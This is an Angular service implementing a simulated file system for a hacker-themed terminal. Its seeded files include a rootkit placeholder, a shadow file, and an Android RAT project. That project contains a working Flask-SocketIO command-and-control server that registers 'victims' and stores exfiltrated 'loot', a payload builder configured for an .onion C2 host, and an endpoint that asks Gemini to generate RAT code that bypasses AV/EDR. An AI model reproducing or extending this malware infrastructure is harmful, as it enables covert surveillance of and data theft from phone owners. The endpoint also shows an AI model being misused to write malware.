import { Injectable, signal, inject } from '@angular/core';
import { LoggingService } from './logging.service';

export interface FileNode {
  type: 'file' | 'dir';
  content?: string;
  children?: Record<string, FileNode>;
}

@Injectable({
  providedIn: 'root'
})
export class FileSystemService {
  private logger = inject(LoggingService);
  // Current working directory path
  currentPath = signal<string>('/home/dac');
  
  // The VFS State
  fileSystem: Record<string, FileNode> = {
    'root': {
        type: 'dir',
        children: {
            'lib': {
                type: 'dir',
                children: {
                    'modules': {
                        type: 'dir',
                        children: {
                            '6.0.0-aqrab': {
                                type: 'dir',
                                children: {
                                    'rootkit.ko': { type: 'file', content: '<BINARY_DATA: KERNEL_MODULE_ELF_64>' }
                                }
                            }
                        }
                    }
                }
            },
            'etc': {
                type: 'dir',
                children: {
                    'passwd': { type: 'file', content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\ndac:x:1000:1000:dac:/home/dac:/bin/bash' },
                    'shadow': { type: 'file', content: 'root:$6$7b3...:19283:0:99999:7:::\ndac:$6$9a2...:19283:0:99999:7:::' },
                    'nginx': {
                        type: 'dir',
                        children: {
                            'sites-available': {
                                type: 'dir',
                                children: {
                                    'al-aqrab': {
                                        type: 'file',
                                        content: `server {
    listen 80;
    server_name localhost;
    location / {
        proxy_pass http://127.0.0.1:5000;
    }
}`
                                    }
                                }
                            }
                        }
                    }
                }
            },
            'var': {
                type: 'dir',
                children: {
                    'logs': {
                        type: 'dir',
                        children: {
                            'system.log': { type: 'file', content: '[BOOT] Kernel loaded.\n[AUTH] User root logged in.\n[NET] Tor circuit established.' }
                        }
                    }
                }
            },
            'opt': {
                type: 'dir',
                children: {
                    'wormgpt': {
                        type: 'dir',
                        children: {
                            'arsenal': {
                                type: 'dir',
                                children: {
                                    'readme.txt': { type: 'file', content: 'WORMGPT-6 ARSENAL (HEXSTRIKE POWERED)\n==================================\nRESEARCH & DEFENSE ONLY.' }
                                }
                            }
                        }
                    }
                }
            },
            'home': {
                type: 'dir',
                children: {
                    'dac': {
                        type: 'dir',
                        children: {
                            'al-aqrab-haas': {
                                type: 'dir',
                                children: {
                                    'craxs_rat': {
                                        type: 'dir',
                                        children: {
                                            '__init__.py': { type: 'file', content: '' },
                                            'builder.py': {
                                                type: 'file',
                                                content: `import os
import base64
import time
import json
from cryptography.fernet import Fernet

class CraxsRAT:
    def __init__(self, c2_host="http://al-aqrab.onion:8080", key=None):
        self.c2_host = c2_host
        self.key = key or Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
    def generate_payload(self, features=['sms', 'cam', 'mic', 'gps', 'keylog']):
        """Generate encrypted RAT payload"""
        payload = {
            'c2': self.c2_host,
            'features': features,
            'persistence': True,
            'stealth': True,
            'anti_vm': True
        }
        
        # Simulate payload generation process
        # 1. Encrypt config
        encrypted_config = self.cipher.encrypt(json.dumps(payload).encode())
        
        # 2. Inject into base APK (mocked)
        apk_name = f"al-aqrab-rat-{int(time.time())}.apk"
        apk_path = f"/tmp/{apk_name}"
        
        return apk_path, self.key.decode()`
                                            },
                                            'c2-server.py': {
                                                type: 'file',
                                                content: `#!/usr/bin/env python3
# Al-Aqrab Craxs C2 Server v7.4 (EVOLVED)
# ---------------------------------------
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import time
import json
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'aqrab_secret_key_x99'
sio = SocketIO(app, cors_allowed_origins="*")

# In-memory storage
clients = {}
exfiltrated_data = []

@sio.on('connect')
def handle_connect():
    sid = request.sid
    ip = request.remote_addr
    print(f"[+] NEW VICTIM CONNECTED: {sid} from {ip}")
    clients[sid] = {
        'ip': ip, 
        'connected_at': time.time(),
        'status': 'ONLINE'
    }
    emit('command', {'type': 'GET_INFO'})

@sio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    if sid in clients:
        print(f"[-] VICTIM LOST: {sid}")
        del clients[sid]

@sio.on('heartbeat')
def handle_heartbeat(data):
    sid = request.sid
    if sid in clients:
        clients[sid].update(data)
        # Log less frequently or verbose
        print(f"[♥] {sid} | Bat: {data.get('battery')}% | Screen: {data.get('screen')}")

@sio.on('exfiltrate')
def handle_exfiltration(data):
    sid = request.sid
    dtype = data.get('type')
    content = data.get('content')
    size = len(content)
    
    filename = f"loot/{sid}_{dtype}_{int(time.time())}.txt"
    with open(filename, "w") as f:
        f.write(str(content))
        
    print(f"[$$$] LOOT RECEIVED: {dtype.upper()} ({size} bytes) saved to {filename}")
    exfiltrated_data.append({'sid': sid, 'type': dtype, 'file': filename})

@app.route('/api/clients', methods=['GET'])
def get_clients():
    return jsonify(clients)

if __name__ == '__main__':
    if not os.path.exists('loot'):
        os.makedirs('loot')
    print("🕷️  AL-AQRAB C2 SERVER LISTENING ON 0.0.0.0:8080")
    print("waiting for connections...")
    sio.run(app, host='0.0.0.0', port=8080)`
                                            }
                                        }
                                    },
                                    'dist': {
                                        type: 'dir',
                                        children: {}
                                    },
                                    'vercel.json': {
                                        type: 'file',
                                        content: `{
  "functions": {
    "api/*.py": {
      "runtime": "python3.12"
    }
  },
  "rewrites": [
    { "source": "/api/(.*)", "destination": "/api/$1" },
    { "source": "/(.*)", "destination": "/index.html" }
  ]
}`
                                    },
                                    'api': {
                                        type: 'dir',
                                        children: {
                                            'gemini.py': {
                                                type: 'file',
                                                content: `import json\nimport os\nfrom flask import Flask...`
                                            },
                                            'craxs.py': {
                                                type: 'file',
                                                content: `from flask import Flask, request, jsonify
import google.generativeai as genai
from craxs_rat.builder import CraxsRAT
import os

app = Flask(__name__)
genai.configure(api_key=os.getenv("GEMINI_API_KEY"))
rat_builder = CraxsRAT(c2_host=os.getenv("C2_HOST", "http://al-aqrab.onion:8080"))

@app.route('/api/craxs/build', methods=['POST'])
def build_rat():
    spec = request.json.get('spec', {})
    features = spec.get('features', ['sms', 'cam', 'gps'])
    
    apk_path, key = rat_builder.generate_payload(features)
    
    return jsonify({
        'apk': f'/downloads/{os.path.basename(apk_path)}',
        'key': key,
        'features': features
    })

@app.route('/api/craxs/evolve', methods=['POST'])
def evolve_rat():
    prompt = request.json['prompt']
    model = genai.GenerativeModel('gemini-1.5-pro')
    
    evolution_prompt = f"""
    EVOLVE Craxs-RAT for: {prompt}
    
    Generate Android RAT with:
    - {prompt} capabilities
    - Bypass latest AV/EDR
    - Persistence mechanisms
    - C2: ws://al-aqrab.onion:8080
    
    Output Smali injection code + features list.
    """
    
    response = model.generate_content(evolution_prompt)
    return jsonify({'evolution': response.text})
`
                                            }
                                        }
                                    },
                                    'public': {
                                        type: 'dir',
                                        children: {
                                            'index.html': {
                                                type: 'file',
                                                content: `<!DOCTYPE html>
<html lang="en">
<head>
    <title>🕷️ Al-Aqrab | CraxsRAT Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-red-600 font-mono p-10">
    <div id="tabs" class="mb-4">
        <button onclick="showTab('chat')" class="border p-2">🧠 AI</button>
        <button onclick="showTab('rat')" class="border p-2">🐛 RAT Builder</button>
    </div>

    <div id="rat-tab" style="display:none">
        <h3>🕷️ Craxs-RAT Generator</h3>
        <input id="rat-prompt" class="bg-gray-900 border p-2 w-full mb-2" placeholder="SMS steal + GPS + Cam...">
        <button onclick="buildRat()" class="bg-red-800 text-white p-2">BUILD APK</button>
        <div id="rat-output" class="mt-4 border p-4"></div>
    </div>

    <script>
    function showTab(id) {
        document.getElementById('rat-tab').style.display = id === 'rat' ? 'block' : 'none';
    }
    
    function buildRat() {
        const prompt = document.getElementById('rat-prompt').value;
       document.getElementById('rat-output').innerHTML = 'Building...';
       setTimeout(() => {
           const data = { apk: '/downloads/payload.apk', key: 'AES-KEY-123' };
           document.getElementById('rat-output').innerHTML = 
                '<a href="' + data.apk + '" download class="text-blue-400">📱 Download RAT APK</a><br>Key: ' + data.key;
       }, 1000);
    }
    </script>
</body>
</html>`
                                            }
                                        }
                                    },
                                    'requirements.txt': {
                                        type: 'file',
                                        content: 'flask==3.0.0\ngoogle-generativeai==0.7.2\ncryptography'
                                    },
                                    'deploy_open.sh': {
                                        type: 'file',
                                        content: `#!/bin/bash
# 1. Add to repo
mkdir -p craxs-rat/{payloads,api}
# Paste all files above

# 2. Vercel deploy
vercel --prod

# 3. Run C2 (local/VPS/Tor)
pip install flask[socketio] cryptography
python craxs-rat/c2-server.py

# 4. Set env vars
vercel env add GEMINI_API_KEY
vercel env add C2_HOST "ws://your-c2.onion:8080"
`
                                    },
                                    'README.md': {
                                        type: 'file',
                                        content: '# Al-Aqrab HaaS\n\nCyber + Biotech Evolution Engine'
                                    }
                                }
                            },
                            'projects': {
                                type: 'dir',
                                children: {}
                            }
                        }
                    }
                }
            }
        }
    }
  };

  resolvePath(pathStr: string): FileNode | null {
    if (!pathStr) return null;
    const res = this.resolvePathInternal(pathStr);
    return res ? res.node : null;
  }

  resolvePathInternal(pathStr: string): { node: FileNode, parent: FileNode | null, key: string } | null {
    try {
        let effectivePath = pathStr.startsWith('~') ? pathStr.replace(/^~/, '/home/dac') : pathStr;
        let pathParts: string[] = [];
        if (effectivePath.startsWith('/')) {
            pathParts = effectivePath.split('/').filter(p => p);
        } else {
            const current = this.currentPath().split('/').filter(p => p);
            const target = effectivePath.split('/').filter(p => p);
            pathParts = [...current, ...target];
        }
        const cleanParts: string[] = [];
        for(const p of pathParts) {
            if (p === '..') cleanParts.pop();
            else if (p !== '.') cleanParts.push(p);
        }
        let current: FileNode = this.fileSystem['root'];
        let parent: FileNode | null = null;
        let currentKey = 'root';
        for (const part of cleanParts) {
            if (current.type === 'dir' && current.children && current.children[part]) {
                parent = current;
                current = current.children[part];
                currentKey = part;
            } else { 
                this.logger.debug('VFS', `Path resolution failed at segment: ${part}`, { fullPath: pathStr, resolvedSoFar: cleanParts });
                return null; 
            }
        }
        return { node: current, parent, key: currentKey };
    } catch (e) {
        this.logger.error('VFS', 'Path resolution exception', e);
        return null;
    }
  }

  changeDirectory(args: string): string | null {
    if (!args || args === '~') { this.currentPath.set('/home/dac'); return null; }
    const node = this.resolvePath(args);
    if (node && node.type === 'dir') {
        let newRawPath = args.startsWith('/') ? args : (args.startsWith('~') ? args.replace(/^~/, '/home/dac') : `${this.currentPath()}/${args}`);
        const parts = newRawPath.split('/').filter(p => p && p !== '.');
        const stack: string[] = [];
        for (const p of parts) { if (p === '..') stack.pop(); else stack.push(p); }
        this.currentPath.set('/' + stack.join('/'));
        this.logger.info('VFS', `Directory changed to ${this.currentPath()}`);
        return null;
    }
    const err = `Directory not found: ${args}`;
    this.logger.warn('VFS', err);
    return err;
  }

  getTargetDir(pathStr: string): { dirNode: FileNode, fileName: string } | null {
      const parts = pathStr.split('/');
      const fileName = parts.pop();
      if (!fileName) return null;
      const dirPath = parts.join('/') || '.';
      const node = this.resolvePath(dirPath);
      if (node && node.type === 'dir') return { dirNode: node, fileName };
      return null;
  }

  createDirectory(pathStr: string): string | null {
      const target = this.getTargetDir(pathStr);
      if (!target) return `Invalid path: ${pathStr}`;
      if (target.dirNode.children && target.dirNode.children[target.fileName]) {
          const err = `Directory already exists: ${target.fileName}`;
          this.logger.warn('VFS', err);
          return err;
      }
      if (!target.dirNode.children) target.dirNode.children = {};
      target.dirNode.children[target.fileName] = { type: 'dir', children: {} };
      this.logger.info('VFS', `Directory created: ${pathStr}`);
      return null;
  }

  createFile(pathStr: string, content: string = ''): string | null {
      const target = this.getTargetDir(pathStr);
      if (!target) return `Invalid path: ${pathStr}`;
      
      // If file exists, update content (needed for echo >)
      if (target.dirNode.children && target.dirNode.children[target.fileName]) {
          const file = target.dirNode.children[target.fileName];
          if (file.type === 'file') {
              file.content = content;
              this.logger.info('VFS', `File updated: ${pathStr}`);
              return null;
          }
          const err = `Cannot overwrite directory: ${target.fileName}`;
          this.logger.error('VFS', err);
          return err;
      }
      
      if (!target.dirNode.children) target.dirNode.children = {};
      target.dirNode.children[target.fileName] = { type: 'file', content };
      this.logger.info('VFS', `File created: ${pathStr}`);
      return null;
  }

  removeNode(pathStr: string): string | null {
      const target = this.getTargetDir(pathStr);
      if (!target) return `Invalid path: ${pathStr}`;
      if (!target.dirNode.children || !target.dirNode.children[target.fileName]) {
          const err = `No such file or directory: ${target.fileName}`;
          this.logger.warn('VFS', err);
          return err;
      }
      delete target.dirNode.children[target.fileName];
      this.logger.info('VFS', `Deleted: ${pathStr}`);
      return null;
  }

  listFiles(pathStr: string): string[] {
    const node = this.resolvePath(pathStr);
    if (node && node.type === 'dir' && node.children) {
      return Object.keys(node.children).map(key => {
        const child = node.children![key];
        return child.type === 'dir' ? key + '/' : key;
      });
    }
    return [];
  }
}